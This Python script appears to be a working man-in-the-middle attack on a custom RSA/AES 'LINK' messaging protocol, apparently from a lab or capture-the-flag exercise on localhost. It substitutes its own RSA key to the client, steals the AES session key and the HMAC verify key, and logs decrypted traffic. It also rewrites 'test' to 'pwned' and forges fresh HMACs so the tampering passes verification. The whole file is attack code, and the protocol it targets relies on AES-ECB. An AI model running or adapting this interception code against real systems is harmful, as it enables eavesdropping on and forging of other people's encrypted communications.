from socket import *
from threading import Thread

from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad, unpad
import hashlib
import hmac
import os

import traceback

import logging
import time
import sys

IN_PORT_SERVER = 9999
IN_PORT_CLIENT = 9998

def start():
    try:
        print(f"[CONNECT] Connecting to the LINK Server...")
        s = socket(AF_INET, SOCK_STREAM)
        s.connect(("localhost", IN_PORT_SERVER))
        print(f"[CONNECT] Connected to the LINK Server")
        actual_rsa_hash = s.recv(1024)
        actual_rsa_key = s.recv(2048)

        print(f"[RSA EXCHANGE] Actual RSA SHA512 Hash: {actual_rsa_hash}")
        print(f"[RSA EXCHANGE] Actual RSA Public Key: {actual_rsa_key}")
    except:
        print(f"[RSA EXCHANGE] Error while getting severside RSA key:")
        traceback.print_exc()
        return

    try:
        print(f"[CONNECT] Waiting LINK Client to connect...")
        s2 = socket(AF_INET, SOCK_STREAM)
        s2.bind(("localhost", IN_PORT_CLIENT))
        s2.listen()
        sock, addr = s2.accept()
        print(f"[CONNECT] Connected: [{addr[0]}]:{addr[1]}")
    except:
        print(f"[CONNECT] Error while accepting incoming connection for the client:")
        traceback.print_exc()
        return

    RSA_KEY = RSA.generate(2048)
    RSA_PUBLIC = RSA_KEY.publickey().export_key()
    RSA_HASH = hashlib.sha512(RSA_PUBLIC).digest()

    print(f"[RSA EXCHANGE] Modified RSA SHA512 Hash: {RSA_HASH}")
    print(f"[RSA EXCHANGE] Modified RSA Public Key: {RSA_PUBLIC}")
    print(f"[RSA EXCHANGE] RSA Private Key: {RSA_KEY.export_key()}")

    sock.sendall(RSA_HASH)
    sock.send(RSA_PUBLIC)

    AES_LOCKED = sock.recv(1024)
    RSA_OBJ = PKCS1_OAEP.new(RSA_KEY)
    AES_KEY = RSA_OBJ.decrypt(AES_LOCKED)

    print(f"[AES EXCHANGE] AES Key: {AES_KEY}")

    SERVER_RSA_OBJ = PKCS1_OAEP.new(RSA.import_key(actual_rsa_key))
    AES_LOCKED = SERVER_RSA_OBJ.encrypt(AES_KEY)
    s.sendall(AES_LOCKED)

    LOCKER = AES.new(AES_KEY, AES.MODE_ECB)

    KEY_TRANSFER = s.recv(1024)
    LOCKED_KEY_TRANSFER = KEY_TRANSFER
    KEY_TRANSFER = LOCKER.decrypt(KEY_TRANSFER)
    KEY_TRANSFER = unpad(KEY_TRANSFER, AES.block_size)
    VERIFY_KEY = KEY_TRANSFER

    print(f"[VERIFY KEY EXCHANGE] Verify Key: {VERIFY_KEY}")

    sock.sendall(LOCKED_KEY_TRANSFER)

    def relay(src, dst):
        cipher = AES.new(AES_KEY, AES.MODE_ECB)
        while True:
            try:
                hmac_recv = src.recv(1024)
                data = src.recv(1024)
                if not data: break
                
                # Decrypt the data
                plain = unpad(cipher.decrypt(data), AES.block_size)
                
                # Modify if 'test' is found
                if b'test' in plain:
                    print(f"[!] Found 'test' - Modifying to 'pwned'")
                    modified = plain.replace(b'test', b'pwned')
                    
                    # Re-encrypt the modified data
                    modified_enc = cipher.encrypt(pad(modified, AES.block_size))
                    
                    # Generate new HMAC for modified data
                    new_hmac = hmac.new(VERIFY_KEY, modified_enc, hashlib.sha256).hexdigest().encode()
                    
                    # Send the modified packets
                    dst.send(new_hmac)
                    dst.send(modified_enc)
                    continue
                    
                print(f"[COMMUNICATION] DATA: {plain}")
                dst.send(hmac_recv)
                dst.send(data)
            
            except Exception as e:
                print(f"[ERROR] Relay failed: {e}")
                break

    IN_thread = Thread(target=relay, args=(sock, s,))
    IN_thread.start()

    OUT_thread = Thread(target=relay, args=(s, sock,))
    OUT_thread.start()

while True:
    start()